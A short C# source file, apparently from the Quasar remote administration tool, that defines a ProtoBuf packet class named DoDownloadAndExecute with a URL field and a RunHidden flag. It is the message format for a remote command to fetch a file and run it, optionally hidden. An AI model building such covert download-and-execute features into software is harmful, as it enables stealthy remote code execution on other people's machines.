using ProtoBuf;

namespace Quasar.Common.Packets
{
    [ProtoContract]
    public class DoDownloadAndExecute : IPacket
    {
        [ProtoMember(1)]
        public string Url { get; set; }

        [ProtoMember(2)]
        public bool RunHidden { get; set; }
    }
}
